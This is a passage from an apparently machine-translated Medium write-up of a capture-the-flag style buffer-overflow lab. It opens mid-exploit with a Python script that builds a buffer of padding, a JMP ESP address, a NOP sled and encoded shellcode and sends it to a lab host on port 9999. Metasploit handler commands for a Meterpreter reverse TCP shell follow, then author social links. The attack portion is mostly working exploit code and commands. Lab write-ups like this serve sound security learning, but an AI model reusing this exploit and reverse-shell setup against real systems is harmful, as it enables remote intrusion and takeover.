b"\x5a\xfa\xda\xc2\x8f\xe1\x79\xe2\xaa\xe5\x72"<br/>shellcode += b"\xb4\x9b\xe8\x4a\xcf\xcf\x2a\xd3\x13\x02\x29"<br/>shellcode += b"\x21\x40\x2c\xc3\xd3\xf1\xd7\x05\xb7\x69\x5a"<br/>shellcode += b"\xef\x17\x8b\x3a\xaa\x8a\xf7\x6b\x4f\x77\xa3"<br/>shellcode += b"\xdd\xa0\xc3\x08\xed\xb9\x7e\x5b\x06\x29\x21"<br/>shellcode += b"\x45\x94\xf3\xf8\x4f\x0f\xf8\x8b\x81\x5c\x7b"<br/>shellcode += b"\x28\x49\x97\x68\x9c\xf7\x70\xb9\x6a\x4b\x30"<br/>shellcode += b"\xf5\x8b\x8b\x61\x1a\xcc\xc2\xb8\xca\x83\x49"<br/>shellcode += b"\xfc\x52\x92\x5b\x4e\xa0\x82\x50\xed\xb3\x60"<br/>shellcode += b"\x03\x7f\x69\x82\xb2\xfd\x9e\xc1\xae\xb1\x75"<br/>shellcode += b"\x8b\x81\x66\x73\x1b\x8c\x03\x91\x0a\x41\x2c"<br/>shellcode += b"\xca\xda\xc2\x94\xe8\x4a\xf1\xe4\x80\x90\x92"<br/>shellcode += b"\x86\xff\x3c\xdd\x26\xc2\x92\x36\x66\xf8\x82"<br/>shellcode += b"\x5f\xfc\x52\x92\x0b\x4e\xa0\x82\x50\xcf\x3a"<br/>shellcode += b"\xc8\x0a\xf4\xab\xec\x07\x95\xc5\x47\x1c\x17"<br/>shellcode += b"\xe1\x79\x7d\xcb\x77\xf3\xb4\x9b\xe9\x3c\xc6"<br/>shellcode += b"\x4c\x06\x6d\xb4\xb1\xe8\xc2\xcb\xed\x13\x54"<br/>shellcode += b"\x03\xcb\x56\xb6\xbc\xe4\xc5\x75\x13\x24\xa0"<br/>shellcode += b"\x9a\x41\x62\xf8\x62\xfe\xec\xf6\x3c\xdd\xa5"<br/>shellcode += b"\x3a"</span><span id="e5d4" class="lv ky iq nh b gy oc no l np nq">buffer = b"A"*offset+jmp_esp+nop_sled+shellcode</span><span id="491a" class="lv ky iq nh b gy oc no l np nq">try:</span><span id="302a" class="lv ky iq nh b gy oc no l np nq">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><span id="f622" class="lv ky iq nh b gy oc no l np nq">    s.connect(("10.0.2.8",9999))</span><span id="88f9" class="lv ky iq nh b gy oc no l np nq">    s.send((b"testuser"+b"\r\n"))</span><span id="7bbc" class="lv ky iq nh b gy oc no l np nq">    s.recv(1024)</span><span id="aafb" class="lv ky iq nh b gy oc no l np nq">    s.send((buffer+b"\r\n"))</span><span id="7c77" class="lv ky iq nh b gy oc no l np nq">    s.recv(1024)</span><span id="6e4a" class="lv ky iq nh b gy oc no l np nq">    s.close()</span><span id="f2ce" class="lv ky iq nh b gy oc no l np nq">except:</span><span id="3219" class="lv ky iq nh b gy oc no l np nq">    print("error")</span><span id="c5e6" class="lv ky iq nh b gy oc no l np nq">    sys.exit()<br/></span></pre><h1 id="6259" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅剥削</h1><p id="d988" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">用Metasploit<br/><code class="fe ne nf ng nh b">exploit/multi/handler</code><br/><code class="fe ne nf ng nh b">set payload windows/meterpreter/reverse_tcp</code><br/><code class="fe ne nf ng nh b">set lhost eth0</code><br/><code class="fe ne nf ng nh b">set lport 4444</code><br/>打开反向shell处理程序，执行上述脚本后监听反向连接！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi og"><img src="../Images/818a81108e72a5ce09ad4fe6663ab660.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Od--HrOFwjFXHNxZcpesog.png"/></div></div></figure><p id="1bdb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们得到了反向外壳。现在我们终于可以找到我们的root.txt文件了</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/3a2d295ae0dde213a2abb41cad38adbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*Gy5eVbO0r9FWf0mn5-OxPA.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/38b720d469add7497886c167e8cf1896.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*Ro86-fynw6bpWRV1CIfEaQ.gif"/></div></figure><p id="ae58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您阅读我的评论！！👊👊</p><p id="edf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请在媒体和其他社交平台上关注我，支持我:</p><div class="oj ok gp gr ol om"><a href="https://surya-dev.medium.com/" rel="noopener follow" target="_blank"><div class="on ab fo"><div class="oo ab op cl cj oq"><h2 class="bd ir gy z fp or fr fs os fu fw ip bi translated">苏亚·德夫·辛格-中等</h2><div class="ot l"><h3 class="bd b gy z fp or fr fs os fu fw dk translated">阅读苏亚·德夫·辛格在媒体上的文章。狂热的网络安全学习者和渗透测试者/道德黑客…</h3></div><div class="ou l"><p class="bd b dl z fp or fr fs os fu fw dk translated">surya-dev.medium.com</p></div></div><div class="ov l"><div class="ow l ox oy oz ov pa kv om"/></div></div></a></div><div class="oj ok gp gr ol om"><a href="https://www.instagram.com/suryadevsingh___/" rel="noopener  ugc nofollow" target="_blank"><div class="on ab fo"><div class="oo ab op cl cj oq"><h2 class="bd ir gy z fp or fr fs os fu fw ip bi translated">SURYA DEV SINGH(@ suryadevsingh _ _)* insta gram照片和视频</h2><div class="ot l"><h3 class="bd b gy z fp or fr fs os fu fw dk translated">编辑描述</h3></div><div class="ou l"><p class="bd b dl z fp or fr fs os fu fw dk translated">www.instagram.com</p></div></div></div></a></div><div class="oj ok gp gr ol om"><a href="https://github.com/surya-dev-singh/" rel="noopener  ugc nofollow" target="_blank"><div class="on ab fo"><div class="oo ab op cl cj oq"><h2 class="bd ir gy z fp or fr fs os fu fw ip bi translated">surya-dev-singh -概述</h2><div class="ot l"><h3 class="bd b gy z fp or fr fs os fu fw dk translated">我是一名自学的渗透测试人员，也是一名非常好奇的网络安全学习者。我想越来越多地了解…</h3></div><div class="ou l"><p class="bd b dl z fp or fr fs os fu fw dk translated">github.com</p></div></div><div class="ov l"><div class="pb l ox oy oz ov pa kv om"/></div></div></a></div><div class="oj ok gp gr ol om"><a href="https://twitter.com/kryolite_secure" rel="noopener  ugc nofollow" target="_blank"><div class="on ab fo"><div class="oo ab op cl cj oq"><h2 class="bd ir gy z fp or fr fs os fu fw ip bi translated">JavaScript不可用。</h2><div class="ot l"><h3 class="bd b gy z fp or fr fs os fu fw dk translated">编辑描述</h3></div><div class="ou l"><p class="bd b dl z fp or fr fs os fu fw dk translated">twitter.com</p></div></div><div class="ov l"><div class="pc l ox oy oz ov pa kv om"/></div></div></a></div><p id="afbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你们可以订阅我🙌在YouTube上:<strong class="jp ir">我在那里发布演练和其他道德黑客相关的视频。</strong></p><div class="oj ok gp gr ol om"><a href="https://www.youtube.com/channel/UCNKXlqfPevPg2Cv1R5YZ6Jw" rel="noopener  ugc nofollow" target="_blank"><div class="on ab fo"><div class="oo ab op cl cj oq"><h2 class="bd ir gy z fp or fr fs os fu fw ip bi translated">Kryolite安全公司</h2><div class="ot l"><h3 class="bd b gy z fp or fr fs os fu fw dk translated">你好世界！在Kryolite Security上，你可以找到关于道德黑客、网络安全、渗透测试、CTFs的视频…</h3></div><div class="ou l"><p class="bd b dl z fp or fr fs os fu fw dk translated">www.youtube.com</p></div></div><div class="ov l"><div class="pd l ox oy oz ov pa kv om"/></div></div></a></div></div><div class="ab cl pe pf hu pg" role="separator"><span class="ph bw bk pi pj pk"/><span class="ph bw bk pi pj pk"/><span class="ph bw bk pi pj"/></div><div class="ij ik il im in"><p id="fd4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ny">来自Infosec的报道:Infosec上每天都有很多事情发生，很难跟上。</em> <a class="ae pl" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="ny">加入我们的每周简讯</em> </strong> </a> <em class="ny">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>